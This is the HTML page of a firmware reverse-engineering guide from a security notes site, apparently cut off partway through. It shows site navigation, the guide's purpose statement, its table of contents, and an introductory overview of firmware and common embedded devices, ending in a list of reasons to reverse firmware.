<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-intel-codex docs-version-current docs-doc-page docs-doc-id-Security/Pentesting/sop-firmware-reverse-engineering" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">Firmware Reverse Engineering | gl0bal01 | Notes &amp; Research</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" property="og:image" content="https://gl0bal01.com/img/lama.jpg"><meta data-rh="true" name="twitter:image" content="https://gl0bal01.com/img/lama.jpg"><meta data-rh="true" property="og:url" content="https://gl0bal01.com/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="keywords" content="cybersecurity, osint, digital forensics, penetration testing, reverse engineering, malware analysis, AI security, intelligence gathering"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-intel-codex-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-intel-codex-current"><meta data-rh="true" property="og:title" content="Firmware Reverse Engineering | gl0bal01 | Notes &amp; Research"><meta data-rh="true" name="description" content="Extract &amp; analyze firmware: binary extraction, filesystem analysis, vulnerability hunting in IoT devices. Tools: Binwalk, Ghidra, QEMU emulation."><meta data-rh="true" property="og:description" content="Extract &amp; analyze firmware: binary extraction, filesystem analysis, vulnerability hunting in IoT devices. Tools: Binwalk, Ghidra, QEMU emulation."><link data-rh="true" rel="icon" href="/icons/favicon.ico"><link data-rh="true" rel="canonical" href="https://gl0bal01.com/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering"><link data-rh="true" rel="alternate" href="https://gl0bal01.com/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering" hreflang="en"><link data-rh="true" rel="alternate" href="https://gl0bal01.com/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://4X4QPM0QJE-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Security & Analysis","item":"https://gl0bal01.com/intel-codex/category/security--analysis"},{"@type":"ListItem","position":2,"name":"Penetration Testing","item":"https://gl0bal01.com/intel-codex/category/penetration-testing"},{"@type":"ListItem","position":3,"name":"Firmware Reverse Engineering","item":"https://gl0bal01.com/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="gl0bal01 Blog - Security Research &amp; Human Psychology RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="gl0bal01 Blog - Security Research &amp; Human Psychology Atom Feed">

<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-NFE7MZ9S3P"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-NFE7MZ9S3P",{anonymize_ip:!0})</script>



<link rel="search" type="application/opensearchdescription+xml" title="gl0bal01 | Notes &amp; Research" href="/opensearch.xml">




<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
<link rel="preconnect" href="https://4X4QPM0QJE-dsn.algolia.net" crossorigin="anonymous">
<link rel="preconnect" href="https://www.googletagmanager.com">
<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="dns-prefetch" href="https://fonts.googleapis.com">
<link rel="dns-prefetch" href="https://www.googletagmanager.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Host+Grotesk:wght@600;800&amp;display=swap"><link rel="stylesheet" href="/assets/css/styles.a89a0862.css">
<script src="/assets/js/runtime~main.adcf1a83.js" defer="defer"></script>
<script src="/assets/js/main.90a6e438.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/icons/android-icon-48x48.png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/icons/android-icon-48x48.png" alt="gl0bal01" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/icons/android-icon-48x48.png" alt="gl0bal01" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">gl0bal01</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" aria-label="Intel Codex documentation" href="/intel-codex">Intel Codex</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link" aria-label="Practical resources navigation menu">Practical</a><ul class="dropdown__menu"><li><a class="dropdown__link" aria-label="OSINT resources" href="/osint">Osint</a></li><li><a class="dropdown__link" aria-label="Cybersecurity resources" href="/cyber">Cyber</a></li><li><a class="dropdown__link" aria-label="Reverse engineering resources" href="/reverse-engineering">Reverse</a></li><li><a class="dropdown__link" aria-label="AI and machine learning resources" href="/ai">AI</a></li></ul></div><a class="navbar__item navbar__link" aria-label="Security and development cheatsheets" href="/cheatsheets">Cheatsheets</a><a class="navbar__item navbar__link" aria-label="Blog posts and articles" href="/blog">Blog</a><a class="navbar__item navbar__link" aria-label="Latest news and updates" href="/news">News</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/gl0bal01" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link header-github-link" aria-label="GitHub repository"></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search (Meta+k)" aria-keyshortcuts="Meta+k"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="8" stroke="currentColor" fill="none" stroke-width="1.4"></circle><path d="m21 21-4.3-4.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/intel-codex"><span title="Intel Codex Overview" class="linkLabel_WmDU">Intel Codex Overview</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/intel-codex/category/investigations"><span title="Investigations" class="categoryLinkLabel_W154">Investigations</span></a><button aria-label="Collapse sidebar category &#x27;Investigations&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Investigations-Index"><span title="Investigation Index" class="linkLabel_WmDU">Investigation Index</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/intel-codex/category/platform-guides"><span title="Platform Guides" class="categoryLinkLabel_W154">Platform Guides</span></a><button aria-label="Collapse sidebar category &#x27;Platform Guides&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/Platforms-Index"><span title="Platform Investigation SOPs" class="linkLabel_WmDU">Platform Investigation SOPs</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-bluesky"><span title="Bluesky SOP" class="linkLabel_WmDU">Bluesky SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-instagram"><span title="Instagram SOP" class="linkLabel_WmDU">Instagram SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-linkedin"><span title="LinkedIn SOP" class="linkLabel_WmDU">LinkedIn SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-reddit"><span title="Reddit SOP" class="linkLabel_WmDU">Reddit SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-telegram"><span title="Telegram SOP" class="linkLabel_WmDU">Telegram SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-tiktok"><span title="TikTok SOP" class="linkLabel_WmDU">TikTok SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-twitter-x"><span title="Twitter/X SOP" class="linkLabel_WmDU">Twitter/X SOP</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/intel-codex/category/investigation-techniques"><span title="Investigation Techniques" class="categoryLinkLabel_W154">Investigation Techniques</span></a><button aria-label="Collapse sidebar category &#x27;Investigation Techniques&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/Techniques-Index"><span title="OSINT Investigation Techniques" class="linkLabel_WmDU">OSINT Investigation Techniques</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-collection-log"><span title="OSINT Collection Log &amp; Chain of Custody" class="linkLabel_WmDU">OSINT Collection Log &amp; Chain of Custody</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-entity-dossier"><span title="Entity Dossier Guide" class="linkLabel_WmDU">Entity Dossier Guide</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-financial-aml-osint"><span title="Financial Crime &amp; AML OSINT" class="linkLabel_WmDU">Financial Crime &amp; AML OSINT</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-image-video-osint"><span title="Image &amp; Video OSINT" class="linkLabel_WmDU">Image &amp; Video OSINT</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-legal-ethics"><span title="Legal, Ethics &amp; Data Governance for OSINT" class="linkLabel_WmDU">Legal, Ethics &amp; Data Governance for OSINT</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-opsec-plan"><span title="OPSEC Planning for OSINT Investigations" class="linkLabel_WmDU">OPSEC Planning for OSINT Investigations</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-reporting-packaging-disclosure"><span title="Reporting, Packaging &amp; Disclosure" class="linkLabel_WmDU">Reporting, Packaging &amp; Disclosure</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-sensitive-crime-intake-escalation"><span title="Sensitive Crime Intake &amp; Escalation" class="linkLabel_WmDU">Sensitive Crime Intake &amp; Escalation</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-web-dns-whois-osint"><span title="Web, DNS &amp; WHOIS OSINT" class="linkLabel_WmDU">Web, DNS &amp; WHOIS OSINT</span></a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/intel-codex/category/security--analysis"><span title="Security &amp; Analysis" class="categoryLinkLabel_W154">Security &amp; Analysis</span></a><button aria-label="Collapse sidebar category &#x27;Security &amp; Analysis&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/intel-codex/category/analysis"><span title="Analysis" class="categoryLinkLabel_W154">Analysis</span></a><button aria-label="Collapse sidebar category &#x27;Analysis&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/Analysis-Index"><span title="Security Analysis SOPs" class="linkLabel_WmDU">Security Analysis SOPs</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-ai-vulnerability-evasion"><span title="AI/ML Vulnerability &amp; Evasion Testing SOP" class="linkLabel_WmDU">AI/ML Vulnerability &amp; Evasion Testing SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-cryptography-analysis"><span title="Cryptography Analysis SOP" class="linkLabel_WmDU">Cryptography Analysis SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-forensics-investigation"><span title="Digital Forensics Investigation SOP" class="linkLabel_WmDU">Digital Forensics Investigation SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-hash-generation-methods"><span title="Hash Generation Methods for Evidence Integrity" class="linkLabel_WmDU">Hash Generation Methods for Evidence Integrity</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-malware-analysis"><span title="Malware Analysis SOP" class="linkLabel_WmDU">Malware Analysis SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-reverse-engineering"><span title="Reverse Engineering" class="linkLabel_WmDU">Reverse Engineering</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/intel-codex/category/penetration-testing"><span title="Penetration Testing" class="categoryLinkLabel_W154">Penetration Testing</span></a><button aria-label="Collapse sidebar category &#x27;Penetration Testing&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/Pentesting-Index"><span title="Pentesting SOPs" class="linkLabel_WmDU">Pentesting SOPs</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-ad-pentest"><span title="Active Directory Pentesting SOP (Authorized)" class="linkLabel_WmDU">Active Directory Pentesting SOP (Authorized)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-bug-bounty"><span title="Bug Bounty Methodology SOP" class="linkLabel_WmDU">Bug Bounty Methodology SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-detection-evasion-testing"><span title="Detection &amp; Evasion Testing SOP (Purple Team)" class="linkLabel_WmDU">Detection &amp; Evasion Testing SOP (Purple Team)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering"><span title="Firmware Reverse Engineering" class="linkLabel_WmDU">Firmware Reverse Engineering</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-linux-pentest"><span title="Linux Pentesting SOP (Authorized)" class="linkLabel_WmDU">Linux Pentesting SOP (Authorized)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-mobile-security"><span title="Mobile Security (iOS &amp; Android)" class="linkLabel_WmDU">Mobile Security (iOS &amp; Android)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-vulnerability-research"><span title="Vulnerability Research SOP" class="linkLabel_WmDU">Vulnerability Research SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-web-application-security"><span title="Web Application Security Testing SOP" class="linkLabel_WmDU">Web Application Security Testing SOP</span></a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Security-Index"><span title="Security Index" class="linkLabel_WmDU">Security Index</span></a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/intel-codex/category/security--analysis"><span>Security &amp; Analysis</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/intel-codex/category/penetration-testing"><span>Penetration Testing</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Firmware Reverse Engineering</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><div class="theme-admonition theme-admonition-danger admonition_xJq3 alert alert--danger"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M5.05.31c.81 2.17.41 3.38-.52 4.31C3.55 5.67 1.98 6.45.9 7.98c-1.45 2.05-1.7 6.53 3.53 7.7-2.2-1.16-2.67-4.52-.3-6.61-.61 2.03.53 3.33 1.94 2.86 1.39-.47 2.3.53 2.27 1.67-.02.78-.31 1.44-1.13 1.81 3.42-.59 4.78-3.42 4.78-5.56 0-2.84-2.53-3.22-1.25-5.61-1.52.13-2.03 1.13-1.89 2.75.09 1.08-1.02 1.8-1.86 1.33-.67-.41-.66-1.19-.06-1.78C8.18 5.31 8.68 2.45 5.05.32L5.03.3l.02.01z"></path></svg></span>Synced from an <strong>Obsidian vault</strong></div><div class="admonitionContent_BuS1"><p>For graph and advanced features, download the <strong>full</strong> <strong><a href="https://github.com/gl0bal01/intel-codex" target="_blank" rel="noopener noreferrer" class="">Intel Codex Vault</a></strong> and open it in <strong>Obsidian</strong>.</p></div></div>
<header><h1>Firmware Reverse Engineering</h1></header>
<blockquote>
<p><strong>Purpose:</strong> Comprehensive guide to extracting, analyzing, and exploiting firmware from embedded devices (routers, IoT devices, cameras, smart home devices) for security research and vulnerability discovery.</p>
</blockquote>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="table-of-contents">Table of Contents<a href="#table-of-contents" class="hash-link" aria-label="Direct link to Table of Contents" title="Direct link to Table of Contents" translate="no">​</a></h2>
<ol>
<li class=""><a href="#overview" class="">Overview</a></li>
<li class=""><a href="#firmware-acquisition" class="">Firmware Acquisition</a></li>
<li class=""><a href="#firmware-analysis" class="">Firmware Analysis</a></li>
<li class=""><a href="#filesystem-extraction" class="">Filesystem Extraction</a></li>
<li class=""><a href="#binary-analysis" class="">Binary Analysis</a></li>
<li class=""><a href="#hardware-interfaces" class="">Hardware Interfaces</a></li>
<li class=""><a href="#emulation--dynamic-analysis" class="">Emulation &amp; Dynamic Analysis</a></li>
<li class=""><a href="#common-vulnerabilities" class="">Common Vulnerabilities</a></li>
<li class=""><a href="#exploitation-techniques" class="">Exploitation Techniques</a></li>
<li class=""><a href="#tools-reference" class="">Tools Reference</a></li>
</ol>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-is-firmware">What is Firmware?<a href="#what-is-firmware" class="hash-link" aria-label="Direct link to What is Firmware?" title="Direct link to What is Firmware?" translate="no">​</a></h3>
<p><strong>Firmware</strong> is software embedded in hardware devices that controls device functionality. Unlike desktop software, firmware:</p>
<ul>
<li class="">Runs on resource-constrained embedded processors (ARM, MIPS, PowerPC)</li>
<li class="">Often uses custom Linux distributions (embedded Linux, BusyBox)</li>
<li class="">May use Real-Time Operating Systems (RTOS) or bare-metal code</li>
<li class="">Stored in non-volatile memory (flash, EEPROM, ROM)</li>
</ul>
<p><strong>Common embedded devices:</strong></p>
<ul>
<li class=""><strong>Network devices:</strong> Routers, switches, access points, firewalls</li>
<li class=""><strong>IoT devices:</strong> Smart cameras, door locks, thermostats, light bulbs</li>
<li class=""><strong>Industrial control:</strong> PLCs (Programmable Logic Controllers), SCADA systems</li>
<li class=""><strong>Consumer electronics:</strong> Smart TVs, set-top boxes, printers</li>
<li class=""><strong>Automotive:</strong> Car infotainment systems, ECUs (Engine Control Units)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-reverse-firmware">Why Reverse Firmware?<a href="#why-reverse-firmware" class="hash-link" aria-label="Direct link to Why Reverse Firmware?" title="Direct link to Why Reverse Firmware?" translate="no">​</a></h3>
<p><strong>Security research:</strong></p>
<ul>
<li class="">Discover vulnerabilities (command injection, authentication bypass, hardcoded credentials)</li>
<li class="">Analyze encryption implementations</li>
<li class="">Understand attack surface before pentesting</li>
</ul>
<p><strong>Compatibility &amp; interoperability:</strong></p>
<ul>
<li class="">Reverse proprietary protocols</li>
